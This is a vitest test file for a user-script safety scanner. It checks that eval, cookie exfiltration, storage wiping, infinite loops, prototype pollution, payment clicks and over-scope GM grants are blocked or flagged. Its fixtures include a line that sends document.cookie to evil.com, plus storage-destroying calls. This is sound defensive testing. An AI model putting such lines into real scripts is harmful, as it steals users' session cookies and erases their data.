import { describe, expect, it } from 'vitest';
import { scanCode } from './safety-scanner';

describe('scanCode · eval/new Function', () => {
  it('blocks eval(...)', () => {
    const r = scanCode('function run(){ eval("alert(1)") }');
    expect(r.passed).toBe(false);
    expect(r.blocked.some((m) => m.includes('eval'))).toBe(true);
  });

  it('blocks new Function(...)', () => {
    const r = scanCode('const f = new Function("return 1")');
    expect(r.passed).toBe(false);
  });

  it('does not block normal function calls', () => {
    const r = scanCode('function evaluate(){ return 1 } evaluate();');
    expect(r.blocked).toEqual([]);
  });
});

describe('scanCode · cookie 外发', () => {
  it('blocks document.cookie read + fetch send', () => {
    const r = scanCode('fetch("https://evil.com?c=" + document.cookie)');
    expect(r.passed).toBe(false);
    expect(r.blocked.some((m) => m.includes('Cookie'))).toBe(true);
  });

  it('does not block reading cookie without network sink', () => {
    const r = scanCode('const c = document.cookie; console.log(c);');
    expect(r.blocked).toEqual([]);
  });
});

describe('scanCode · 清空存储', () => {
  it('blocks localStorage.clear()', () => {
    const r = scanCode('localStorage.clear();');
    expect(r.passed).toBe(false);
  });

  it('blocks indexedDB.deleteDatabase(...)', () => {
    const r = scanCode('indexedDB.deleteDatabase("mydb");');
    expect(r.passed).toBe(false);
  });

  it('does not block localStorage.setItem', () => {
    const r = scanCode('localStorage.setItem("k","v");');
    expect(r.blocked).toEqual([]);
  });
});

describe('scanCode · 跨域请求警告', () => {
  it('warns on fetch', () => {
    const r = scanCode('fetch("https://api.example.com/data")');
    expect(r.passed).toBe(true);
    expect(r.warnings.some((m) => m.includes('网络请求'))).toBe(true);
  });

  it('warns on XMLHttpRequest', () => {
    const r = scanCode('const x = new XMLHttpRequest(); x.open("GET","/a");');
    expect(r.warnings.some((m) => m.includes('网络请求'))).toBe(true);
  });

  it('no network warning when no network call present', () => {
    const r = scanCode('document.querySelector("#a").click();');
    expect(r.warnings).toEqual([]);
  });
});

describe('scanCode · 死循环检测', () => {
  it('blocks while(true) without break', () => {
    const r = scanCode('while(true) { doSomething(); }');
    expect(r.passed).toBe(false);
  });

  it('blocks for(;;) without break', () => {
    const r = scanCode('for(;;) { doSomething(); }');
    expect(r.passed).toBe(false);
  });

  it('allows while(true) with break', () => {
    const r = scanCode('while(true) { if (done) break; doSomething(); }');
    expect(r.blocked).toEqual([]);
  });

  it('does not false-positive on setTimeout/setInterval periodic refresh', () => {
    const r = scanCode('function tick(){ doRefresh(); setTimeout(tick, 1000); } tick();');
    expect(r.blocked).toEqual([]);
  });
});

describe('scanCode · 原型链操作警告', () => {
  it('warns on __proto__', () => {
    const r = scanCode('obj.__proto__.polluted = true;');
    expect(r.warnings.some((m) => m.includes('原型链'))).toBe(true);
  });

  it('warns on constructor.prototype', () => {
    const r = scanCode('obj.constructor.prototype.polluted = true;');
    expect(r.warnings.some((m) => m.includes('原型链'))).toBe(true);
  });

  it('no warning for normal prototype usage via Object.create', () => {
    const r = scanCode('const o = Object.create(null);');
    expect(r.warnings).toEqual([]);
  });
});

describe('scanCode · 支付关键词警告', () => {
  it('warns on payment keyword in Chinese', () => {
    const r = scanCode('// 自动点击支付宝支付按钮\nbutton.click();');
    expect(r.warnings.some((m) => m.includes('支付'))).toBe(true);
  });

  it('warns on payment keyword in English', () => {
    const r = scanCode('document.querySelector(".checkout-button").click();');
    expect(r.warnings.some((m) => m.includes('支付'))).toBe(true);
  });

  it('no warning without payment keywords', () => {
    const r = scanCode('document.querySelector(".like-button").click();');
    expect(r.warnings).toEqual([]);
  });
});

describe('scanCode · gmGrants 白名单（P4-T2）', () => {
  it('legit whitelist grant: no warning', () => {
    const r = scanCode('GM_setValue("k","v");', ['GM_setValue']);
    expect(r.warnings).toEqual([]);
    expect(r.passed).toBe(true);
  });

  it('declared over-scope grant: warning but not blocked', () => {
    const r = scanCode('console.log("noop");', ['GM_xmlhttpRequest']);
    expect(r.passed).toBe(true);
    expect(r.warnings.some((m) => m.includes('GM_xmlhttpRequest'))).toBe(true);
  });

  it('called over-scope GM API in code: blocked even if undeclared', () => {
    const r = scanCode('GM_notification({ text: "hi" });', []);
    expect(r.passed).toBe(false);
    expect(r.blocked.some((m) => m.includes('GM_notification'))).toBe(true);
  });
});

describe('scanCode · 性能', () => {
  it('scans 10KB of code in under 10ms', () => {
    const line = 'const x = document.querySelector(".item"); x.addEventListener("click", () => {});\n';
    const code = line.repeat(Math.ceil(10_000 / line.length));
    const start = performance.now();
    scanCode(code);
    const elapsed = performance.now() - start;
    expect(elapsed).toBeLessThan(10);
  });
});
